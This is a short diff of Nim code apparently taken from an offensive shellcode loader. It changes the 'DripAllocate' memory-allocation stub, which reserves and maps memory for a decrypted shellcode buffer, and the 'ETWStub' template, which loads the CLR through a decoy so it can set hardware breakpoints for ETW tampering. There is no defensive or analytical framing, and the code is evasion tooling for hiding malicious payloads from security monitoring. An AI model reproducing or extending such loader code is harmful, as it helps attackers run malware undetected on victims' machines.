@@ -481,7 +481,9 @@ let DripAllocateStubSecond * = """
                 currentVmBase = cast[LPVOID](cast[DWORD_PTR](currentVmBase) + sc_size)
         
         # Set the final decryptbuffer address to the first reserved address
-        decryptbuffer = vcVmResv[0]
+        when defined(remoteMapSection):
+            when defined(AllocateDripStyle):
+                decryptbuffer = vcVmResv[0]
 
         var offsetSc: DWORD = 0
         var oldProt: DWORD
@@ -1929,11 +1931,12 @@ let ETWStub * = """
     # So I'm first loading CLR with harmless Code, so that the Thread exists and afterwards set Breakpoints for each Thread.
     proc Decoy() =
       ## Create a CLR object (aka. C# instance) and call the method
-      var mscor = load(obf("mscorlib"))
-      var rand = mscor.new(obf("System.Random"))
-      var randomNumber = rand.Next()
-      when defined(verbose):
-        echo randomNumber
+      clrStart()
+      #var mscor = load(obf("mscorlib"))
+      #var rand = mscor.new(obf("System.Random"))
+      #var randomNumber = rand.Next()
+      #when defined(verbose):
+      #  echo randomNumber
     # This function leads to a process crash for Powershell as well as for DLLs loaded via rundll32.exe or else. Who knows why, but we'll therefore remove it which leads to us not being able to set a Hardware Breakpoint for the clr.dll Thread.
     when not defined(powershell):
         when not defined(lib_only):
